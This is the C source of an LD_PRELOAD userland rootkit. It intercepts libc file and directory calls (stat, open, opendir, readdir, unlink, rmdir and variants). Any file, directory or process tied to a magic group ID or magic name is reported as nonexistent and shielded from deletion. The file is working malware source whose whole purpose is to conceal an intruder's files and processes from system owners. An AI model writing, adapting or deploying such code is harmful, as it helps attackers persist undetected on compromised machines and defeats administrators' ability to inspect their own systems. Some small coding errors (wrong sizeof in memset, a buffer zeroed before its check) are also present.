#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <limits.h>
#include <errno.h>
#include "config.h"

static void init (void) __attribute__ ((constructor));

static int (*old_fxstat)(int ver, int fildes, struct stat *buf);
static int (*old_fxstat64)(int ver, int fildes, struct stat64 *buf);
static int (*old_lxstat)(int ver, const char *file, struct stat *buf);
static int (*old_lxstat64)(int ver, const char *file, struct stat64 *buf);
static int (*old_open)(const char *pathname, int flags, mode_t mode);
static int (*old_rmdir)(const char *pathname);
static int (*old_unlink)(const char *pathname);
static int (*old_unlinkat)(int dirfd, const char *pathname, int flags);
static int (*old_xstat)(int ver, const char *path, struct stat *buf);
static int (*old_xstat64)(int ver, const char *path, struct stat64 *buf);

static DIR *(*old_fdopendir)(int fd);
static DIR *(*old_opendir)(const char *name);

static struct dirent *(*old_readdir)(DIR *dir);
static struct dirent64 *(*old_readdir64)(DIR *dir);

void init(void)
{
	#ifdef DEBUG
	printf("[-] ld_poison loaded.\n");
	#endif

	old_fxstat = dlsym(RTLD_NEXT, "__fxstat");
	old_fxstat64 = dlsym(RTLD_NEXT, "__fxstat64");
	old_lxstat = dlsym(RTLD_NEXT, "__lxstat");
	old_lxstat64 = dlsym(RTLD_NEXT, "__lxstat64");
	old_open = dlsym(RTLD_NEXT,"open");
	old_rmdir = dlsym(RTLD_NEXT,"rmdir");
	old_unlink = dlsym(RTLD_NEXT,"unlink");	
	old_unlinkat = dlsym(RTLD_NEXT,"unlinkat");
	old_xstat = dlsym(RTLD_NEXT, "__xstat");
	old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
	
	old_fdopendir = dlsym(RTLD_NEXT, "fdopendir");
	old_opendir = dlsym(RTLD_NEXT, "opendir");
	
	old_readdir = dlsym(RTLD_NEXT, "readdir");
	old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
}

int fstat(int fd, struct stat *buf)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("fstat hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat(_STAT_VER, fd, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}

	return old_fxstat(_STAT_VER, fd, buf);
}

int fstat64(int fd, struct stat64 *buf)
{
	struct stat64 s_fstat;

	#ifdef DEBUG
	printf("fstat64 hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat64(_STAT_VER, fd, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}
	
	return old_fxstat64(_STAT_VER, fd, buf);
}

int __fxstat(int ver, int fildes, struct stat *buf)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("__fxstat hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat(ver,fildes, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}
	return old_fxstat(ver,fildes, buf);
}

int __fxstat64(int ver, int fildes, struct stat64 *buf)
{
	struct stat64 s_fstat;

	#ifdef DEBUG
	printf("__fxstat64 hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat64(ver, fildes, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}

	return old_fxstat64(ver, fildes, buf);
}

int lstat(const char *file, struct stat *buf)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("lstat hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_lxstat(_STAT_VER, file, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID || strstr(file,CONFIG_FILE) || strstr(file,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_lxstat(_STAT_VER, file, buf);
}

int lstat64(const char *file, struct stat64 *buf)
{
	struct stat64 s_fstat;

	#ifdef DEBUG
	printf("lstat64 hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_lxstat64(_STAT_VER, file, &s_fstat);

	if (s_fstat.st_gid == MAGIC_GID || strstr(file,CONFIG_FILE) || strstr(file,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_lxstat64(_STAT_VER, file, buf);
}

int __lxstat(int ver, const char *file, struct stat *buf)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("__lxstat hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_lxstat(ver, file, &s_fstat);

	if (s_fstat.st_gid == MAGIC_GID || strstr(file,CONFIG_FILE) || strstr(file,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_lxstat(ver, file, buf);
}

int __lxstat64(int ver, const char *file, struct stat64 *buf)
{
	struct stat64 s_fstat;

	#ifdef DEBUG
	printf("__lxstat64 hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_lxstat64(ver, file, &s_fstat);
	
	#ifdef DEBUG
	printf("File: %s\n",file);
	printf("GID: %d\n",s_fstat.st_gid);
	#endif
	
	if(s_fstat.st_gid == MAGIC_GID || strstr(file,CONFIG_FILE) || strstr(file,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_lxstat64(ver, file, buf);
}

int open(const char *pathname, int flags, mode_t mode)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("open hooked.\n");
	#endif
	
	memset(&s_fstat, 0, sizeof(stat));

	old_xstat(_STAT_VER, pathname, &s_fstat);
	
	if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL) || (strstr(pathname, CONFIG_FILE) != NULL)) {
		errno = ENOENT;
		return -1;
	}

	return old_open(pathname,flags,mode);
}

int rmdir(const char *pathname)
{
	struct stat s_fstat;
	
	#ifdef DEBUG
	printf("rmdir hooked.\n");
	#endif
	
	memset(&s_fstat, 0, sizeof(stat));
	
	old_xstat(_STAT_VER, pathname, &s_fstat);
	
	if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL) || (strstr(pathname, CONFIG_FILE) != NULL)) {
		errno = ENOENT;
		return -1;
	}
	
	return old_rmdir(pathname);
}

int stat(const char *path, struct stat *buf)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("stat hooked\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat(_STAT_VER, path, &s_fstat);
	
	#ifdef DEBUG
	printf("Path: %s\n",path);
	printf("GID: %d\n",s_fstat.st_gid);
	#endif
	
	if(s_fstat.st_gid == MAGIC_GID || strstr(path,CONFIG_FILE) || strstr(path,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_xstat(3, path, buf);
}

int stat64(const char *path, struct stat64 *buf)
{
	struct stat64 s_fstat;

	#ifdef DEBUG
	printf("stat64 hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat64(_STAT_VER, path, &s_fstat);

	if (s_fstat.st_gid == MAGIC_GID || strstr(path,CONFIG_FILE) || strstr(path,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_xstat64(_STAT_VER, path, buf);
}

int __xstat(int ver, const char *path, struct stat *buf)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("xstat hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat(ver,path, &s_fstat);

	#ifdef DEBUG
	printf("Path: %s\n",path);
	printf("GID: %d\n",s_fstat.st_gid);
	#endif 
	
	memset(&s_fstat, 0, sizeof(stat));

	if(s_fstat.st_gid == MAGIC_GID || strstr(path,CONFIG_FILE) || strstr(path,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_xstat(ver,path, buf);
}

int __xstat64(int ver, const char *path, struct stat64 *buf)
{
	struct stat64 s_fstat;
	
	#ifdef DEBUG
	printf("xstat64 hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat64(ver,path, &s_fstat);

	#ifdef DEBUG
	printf("Path: %s\n",path);
	printf("GID: %d\n",s_fstat.st_gid);
	#endif 

	if(s_fstat.st_gid == MAGIC_GID || strstr(path,CONFIG_FILE) || strstr(path,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}
	
	return old_xstat64(ver,path, buf);
}

int unlink(const char *pathname)
{
	struct stat s_fstat;
	
	#ifdef DEBUG
	printf("unlink hooked.\n");
	#endif
	
	memset(&s_fstat, 0, sizeof(stat));
	
	old_xstat(_STAT_VER, pathname, &s_fstat);
	
	if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL) || (strstr(pathname, CONFIG_FILE) != NULL)) {
		errno = ENOENT;
		return -1;
	}
	
	return old_unlink(pathname);
}

int unlinkat(int dirfd, const char *pathname, int flags)
{
	struct stat s_fstat;
	
	#ifdef DEBUG
	printf("unlinkat hooked.\n");
	#endif
	
	memset(&s_fstat, 0, sizeof(stat));
	
	old_fxstat(_STAT_VER, dirfd, &s_fstat);
	
	if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL) || (strstr(pathname, CONFIG_FILE) != NULL)) {
		errno = ENOENT;
		return -1;
	}
	
	return old_unlinkat(dirfd, pathname, flags);
}

DIR *fdopendir(int fd)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("fdopendir hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat(_STAT_VER, fd, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID) {
		errno = ENOENT;
		return NULL;
	}

	return old_fdopendir(fd);
}

DIR *opendir(const char *name)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("opendir hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat(_STAT_VER, name, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID || strstr(name,CONFIG_FILE) || strstr(name,MAGIC_DIR)) {
		errno = ENOENT;
		return NULL;
	}

	return old_opendir(name);
}

struct dirent *readdir(DIR *dirp)
{
	struct dirent *dir;
	struct stat s_fstat;
	
	memset(&s_fstat, 0, sizeof(stat));

	#ifdef DEBUG
	printf("readdir hooked.\n");
	#endif

	do {
		dir = old_readdir(dirp);
		
		if (dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name,"/\0") == 0)) 
			continue;

		if(dir != NULL) {
	                char path[PATH_MAX + 1];
			snprintf(path,PATH_MAX,"/proc/%s",dir->d_name);
	                old_xstat(_STAT_VER, path, &s_fstat);
		}
	} while(dir && (strstr(dir->d_name, MAGIC_DIR) != 0 || strstr(dir->d_name, CONFIG_FILE) != 0 || s_fstat.st_gid == MAGIC_GID));

	return dir;
}

struct dirent64 *readdir64(DIR *dirp)
{
	struct dirent64 *dir;
	struct stat s_fstat;
	
	memset(&s_fstat, 0, sizeof(stat));

	#ifdef DEBUG
	printf("readdir64 hooked.\n");
	#endif

	do {
		dir = old_readdir64(dirp);
		
		if (dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name,"/\0") == 0))  
			continue;

		if(dir != NULL) {
	                char path[PATH_MAX + 1];
			snprintf(path,PATH_MAX,"/proc/%s",dir->d_name);
	                old_xstat(_STAT_VER, path, &s_fstat);
		}
        } while(dir && (strstr(dir->d_name, MAGIC_DIR) != 0 || strstr(dir->d_name, CONFIG_FILE) != 0 || s_fstat.st_gid == MAGIC_GID));
	
	return dir;
}	
